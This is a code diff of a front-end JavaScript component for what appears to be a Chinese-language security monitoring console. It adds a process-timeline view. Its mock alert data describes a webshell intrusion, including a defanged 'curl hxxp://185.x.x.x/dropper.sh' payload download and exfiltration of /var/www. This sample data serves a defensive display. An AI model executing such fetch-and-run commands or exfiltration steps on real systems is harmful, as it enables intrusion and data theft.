+        ['09:14:02', '异常外联', '与 185.66.21.9:443 建立长连接', 'p5', '可疑进程持续外联', '命令控制', 'T1071 应用层协议', '中危', 'INC-3202'],
+        ['09:15:31', '数据外传', '上行 38.2MB，疑似打包 /var/www', 'p5', '可疑进程持续外联', '数据外传', 'T1041 通过 C2 通道外传', '中危', 'INC-3202'],
         ['09:12:05', '上传文件', 'POST /upload → /tmp/shell.php 已落地', 'p2', 'WebShell 植入并反弹连接', '初始访问', 'T1190 利用面向公众的应用', '高危', 'INC-3201'],
         ['09:12:38', 'WebShell 执行命令', '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh', 'p3', 'WebShell 植入并反弹连接', '执行', 'T1059.004 Unix Shell', '高危', 'INC-3201'],
         ['09:12:41', '下载载荷', 'curl 拉取 dropper.sh（12.4KB）', 'p4', 'WebShell 植入并反弹连接', '执行', 'T1105 入口工具传输', '高危', 'INC-3201'],
@@ -2114,6 +2218,65 @@ class Component extends DCLogic {
       ls.piTl = evs.slice().sort((a, b) => (a.t < b.t ? -1 : 1)).map((e) => ({ t: e.t, ty: e.ty, d: e.d, stg: e.stg, ak: e.ak, pr: PM[e.pr].n + '（' + PM[e.pr].pid + '）', pg: pick(e.pr) }));
       ls.piTlHas = ls.piTl.length > 0; ls.piTlNone = !ls.piTl.length;
       ls.piAttr = [['进程名', sel.n], ['PID', sel.pid], ['父进程', ls.pS.par], ['运行用户', sel.user], ['启动时间', sel.start], ['退出时间', sel.state === '已退出' ? '11-04 ' + sel.start.slice(6, 11) + ':40' : '—'], ['签名', sel.sig, sel.sig === '无签名' ? 'hd-red' : ''], ['SHA256', sel.sha, 'pi-mono'], ['文件路径', sel.cmd.split(' ')[0].replace(/:$/, ''), 'pi-mono'], ['实例 ID', h.n + '/' + sel.id, 'pi-mono']].map(([k, v, c2]) => ({ k, v: String(v), c: c2 || '' }));
+      /* tw: 进程时间线（Trace Waterfall 式：缩进树 + 生命周期条 + 告警点 + 行内详情） */
+      { const NOW = 1440; const EXM = { p4: 3 / 60, p10: 1 / 60, p11: 2 / 60, p6: 1 / 60 };
+        const tm = (str) => { const m = /^(\d\d)-(\d\d) (\d\d):(\d\d)(?::(\d\d))?$/.exec(str); if (!m) return 0; const day = (+m[1] - 11) * 31 + (+m[2]); return (day - 3) * 1440 + (+m[3]) * 60 + (+m[4]) + (+(m[5] || 0)) / 60 - 720; };
+        const et = (t) => tm('11-04 ' + t);
+        const W = { '近 1 小时': [1380, 1440], '近 7 天': [-6 * 1440, 1440], '近 30 天': [-29 * 1440, 1440] }[rgN] || [0, 1440];
+        PR.forEach((x) => { x.t0 = tm(x.start); x.t1 = x.state === '已退出' ? x.t0 + (EXM[x.id] || 0.5) : NOW; });
+        const evIn = EV.filter((e) => et(e.t) >= W[0] && et(e.t) <= W[1]);
+        const act = evIn.map((e) => et(e.t)).concat(PR.filter((x) => x.al && x.t0 >= W[0]).map((x) => x.t0));
+        const STEP = [1, 2, 5, 10, 15, 30, 60, 120, 180, 360, 720, 1440, 2880, 10080];
+        let fz = null; if (act.length) { const a0 = Math.min.apply(null, act), a1 = Math.max.apply(null, act); const st0 = STEP.find((x) => (a1 - a0 + 30) / x <= 8) || 60; fz = [Math.max(W[0], Math.floor((a0 - 10) / st0) * st0), Math.min(W[1], Math.ceil((a1 + 10) / st0) * st0)]; if (fz[1] - fz[0] >= (W[1] - W[0]) * 0.6) fz = null; }
+        const focus = !!fz && st.hdFz !== false; const V = focus ? fz : W; const span = V[1] - V[0];
+        const ck = (m) => { const tot = m + 720 + 3 * 1440; const d = Math.floor(tot / 1440); const r = tot - d * 1440; const hh = Math.floor(r / 60), mm = Math.floor(r % 60); return { md: '11-' + String(d).padStart(2, '0'), hm: String(hh).padStart(2, '0') + ':' + String(mm).padStart(2, '0') }; };
+        const lab = (m) => { const c = ck(m); return (V[0] < 0 && V[1] - V[0] > 2880) ? c.md : c.hm; };
+        const step = STEP.find((x) => span / x <= 7) || 10080; ls.twTk = [];
+        for (let v = Math.ceil(V[0] / step) * step; v < V[1]; v += step) ls.twTk.push({ n: span > 2880 ? ck(v).md : (v === Math.ceil(V[0] / step) * step && span >= 1440 ? ck(v).md + ' ' + ck(v).hm : ck(v).hm), st: 'left:' + ((v - V[0]) / span * 100).toFixed(3) + '%' });
+        ls.twNowOn = V[1] >= NOW; ls.twNowS = 'left:calc(' + ((NOW - V[0]) / span * 100).toFixed(3) + '% - 1px)';
+        const rgTxt = (a, b) => { const A = ck(a), B = ck(b); return A.md === B.md ? A.md + ' ' + A.hm + ' — ' + B.hm : A.md + ' ' + A.hm + ' — ' + B.md + ' ' + B.hm; };
+        ls.twVw = fz ? [['告警时段 ' + ck(fz[0]).hm + '–' + ck(fz[1]).hm, true], [rgN, false]].map(([n, f]) => ({ n, c: f === focus ? 'on' : '', t: ev(() => S({ hdFz: f })) })) : [];
+        ls.twRgN = '时间轴 ' + rgTxt(V[0], V[1]);
+        const pct = (v) => (v - V[0]) / span * 100;
+        const dur = (m) => { if (m < 1) return Math.max(1, Math.round(m * 60)) + ' 秒'; if (m < 60) return Math.round(m) + ' 分钟'; if (m < 1440) return Math.floor(m / 60) + ' 小时' + (Math.round(m % 60) ? ' ' + Math.round(m % 60) + ' 分' : ''); return Math.floor(m / 1440) + ' 天 ' + Math.floor((m % 1440) / 60) + ' 小时'; };
+        const fo = st.hdFo || {}; const popId = st.hdPop === undefined ? (nf['进程'] ? nf['进程'] : '') : st.hdPop;
+        const rows = []; const walk2 = (x, d, hid) => { if (!keep(x)) return; if (!hid) rows.push([x, d]); const f = hid || !!fo[x.id]; kids(x.id).forEach((k) => walk2(k, d + 1, f)); };
+        PR.filter((x) => !x.par || x.par === '?').forEach((x) => walk2(x, 0, false));
+        const evOf = (ids) => evIn.filter((e) => ids.indexOf(e.pr) >= 0);
+        const DC = { m: 'pi-d m', s: 'pi-d s', n: 'pi-d n' };
+        ls.twRows = rows.map(([x, d], i) => { const ks = kids(x.id); const f = !!fo[x.id] && ks.length > 0; const dd = desc(x.id);
+          const s0 = Math.max(x.t0, V[0]), s1 = Math.min(x.t1, V[1]); const vis = s1 >= V[0] && s0 <= V[1] && s1 >= s0;
+          const L = pct(s0), R = pct(s1); const run = x.state !== '已退出';
+          const mk = evOf([x.id]).map((e) => ({ c: 'tw-mk', st: 'left:' + pct(et(e.t)).toFixed(3) + '%', n: e.t + ' ' + e.ty })).concat(f ? evOf(dd).map((e) => ({ c: 'tw-mk k', st: 'left:' + pct(et(e.t)).toFixed(3) + '%', n: e.t + ' ' + e.ty + '（' + PM[e.pr].n + '）' })) : []);
+          const dl = run ? '已运行 ' + dur(x.t1 - x.t0) : dur(x.t1 - x.t0) + ' · 已退出';
+          const inside = vis && R > 74 && R - L > 26; const before = vis && R > 74 && !inside && L > 22; const ind = Math.min(d, 7);
+          return { n: x.n, pid: x.pid, cmd: x.cmd, lv: d + 1, on: x.id === selId ? 'true' : 'false', aria: x.n + ' PID ' + x.pid + '，' + dl,
+            c: 'tw-row' + (x.id === selId ? ' on' : '') + (ks.length ? ' par' : '') + (f ? ' fo' : '') + (x.sev === 'n' && !subAl(x.id) ? ' dim' : ''),
+            hasK: ks.length > 0, ex: f ? 'false' : 'true', fn: f ? '展开子进程' : '折叠子进程', cs: 'left:' + (14 + ind * 16) + 'px',
+            fold: ev(() => S({ hdFo: Object.assign({}, fo, { [x.id]: !fo[x.id] }) })),
+            gd: 'width:' + (ind * 16) + 'px' + (ind ? '' : ';margin-right:14px'), dc: DC[x.sev],
+            tag: x.par === '?' ? '父进程缺失' : '', more: f ? '+' + dd.length : '', al: (f ? subAl(x.id) : x.al) ? '▲' + (f ? subAl(x.id) : x.al) : '',
+            bar: vis, bc: 'tw-b ' + x.sev + (x.t0 < V[0] ? ' cl' : '') + (run && x.t1 >= V[1] ? ' run' : '') + (!run ? ' ex' : ''), bs: 'left:' + L.toFixed(3) + '%;width:' + Math.max(0, R - L).toFixed(3) + '%;animation-delay:' + Math.min(400, 40 + i * 24) + 'ms',
+            mk, dur: vis ? dl : (x.t1 < V[0] ? '‹ 范围前已退出' : '范围后启动 ›'), tc: 'tw-t' + (inside ? ' in' : '') + (x.sev === 'm' ? ' m' : ''),
+            ts: !vis ? (x.t1 < V[0] ? 'left:0' : 'right:0') : before ? 'right:calc(' + (100 - L).toFixed(3) + '% + 8px)' : inside ? 'right:calc(' + (100 - R).toFixed(3) + '% + 6px)' : 'left:calc(' + R.toFixed(3) + '% + 6px)',
+            t: ev(() => S({ hdP: x.id, hdPop: popId === x.id ? '' : x.id })), _i: i, _L: vis ? L : 0 }; });
+        ls.twNone = !rows.length;
+        const nAl = PR.filter((x) => x.al).length;
+        ls.twSt = [['进程', PR.length, ''], ['告警进程', nAl, 'r', true], ['告警', evIn.length, 'r'], ['关联事件', Object.keys(evIn.reduce((o, e) => (o[e.inc] = 1, o), {})).length, ''], ['已退出', PR.filter((x) => x.state === '已退出').length, '']]
+          .map(([n, v, c, b]) => ({ n, v, b: !!b, nb: !b, c: 'tw-s' + (c ? ' ' + c : '') + (b && only ? ' on' : ''), a: only ? 'true' : 'false', t: b ? ls.piOnlyT : ev(() => {}) }));
+        const pr = ls.twRows.find((r) => PM[popId] && r.n === PM[popId].n && r.pid === PM[popId].pid);
+        ls.twPop = !!pr; ls.twX = ev(() => S({ hdPop: '' }));
+        if (pr) { const x = PM[popId]; const idx = pr._i; const up = ls.twRows.length > 8 && idx > ls.twRows.length - 7;
+          const lp = Math.min(Math.max(pr._L, 0), 52) / 100;
+          ls.twPopS = (up ? 'bottom:calc(100% - ' + (36 + idx * 32) + 'px + 4px);transform-origin:24px bottom' : 'top:' + (36 + (idx + 1) * 32 + 4) + 'px') + ';left:calc(var(--twn) + 12px + (100% - var(--twn) - 32px - 360px) * ' + (lp / 0.52).toFixed(3) + ')';
+          const own2 = EV.filter((e) => e.pr === x.id).sort((a, b) => (a.t < b.t ? -1 : 1)); const pp = PM[x.par]; const inc1 = (own2[0] || EV.find((e) => [x.id].concat(desc(x.id)).indexOf(e.pr) >= 0) || {}).inc;
+          ls.tp = { n: x.n, pid: x.pid, user: x.user, dc: DC[x.sev], sevN: SEVN[x.sev][0], sevC: SEVN[x.sev][1], state: x.state, stC: x.state === '运行中' ? 'kc-tag info' : 'kc-tag mut', cmd: x.cmd, sig: x.sig + ' · ' + x.sha,
+            kv: [['启动', x.start.slice(0, 11)], ['持续', dur(x.t1 - x.t0)], ['自身告警', String(x.al), x.al ? 'r' : ''], ['子树告警', String(subAl(x.id)), subAl(x.id) ? 'r' : '']].map(([k, v, c]) => ({ k, v, c: c || '' })),
+            hasPar: !!pp, noPar: !pp, par: pp ? pp.n + '（' + pp.pid + '）' : x.par === '?' ? '父进程缺失' : '无（根进程）', parGo: pp ? ev(() => S({ hdP: pp.id, hdPop: pp.id })) : ev(() => {}),
+            evHas: own2.length > 0, ev: own2.slice(0, 4).map((e) => ({ t: e.t.slice(0, 5), ty: e.ty, d: e.d, c: '' })).concat(own2.length > 4 ? [{ t: '', ty: '', d: '另有 ' + (own2.length - 4) + ' 条，见下方行为时间线', c: 'x' }] : []),
+            incHas: !!inc1, evN: own2.length || subAl(x.id) ? '查看行为时间线' : '查看进程属性', evGo: ev(() => { S({ hdPt: own2.length || subAl(x.id) ? '行为时间线' : '进程属性', hdPop: '' }); try { setTimeout(() => { const el = document.querySelector('.pi-sub'); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); }, 60); } catch (e) {} }) };
+        } else { ls.twPopS = ''; ls.tp = { kv: [], ev: [] }; }
+        ls.piSelT = sel.n + '（' + sel.pid + '）'; }
       const rng = st.hdRg || '1 小时';
       ls.rng = ['1 小时', '6 小时', '24 小时', '7 天'].map((n) => ({ n, cls: n === rng ? 'on' : '', pick: ev(() => S({ hdRg: n })) }));
       const wave = (k, base, amp) => { const pts = []; for (let i = 0; i <= 30; i++) { const v = base + amp * Math.sin((i + k) * 0.55) * Math.cos((i + seed) * 0.21) + amp * 0.4 * Math.sin(i * 1.7 + k); pts.push([i * 10, Math.max(4, Math.min(76, 80 - v * 0.8))]); }
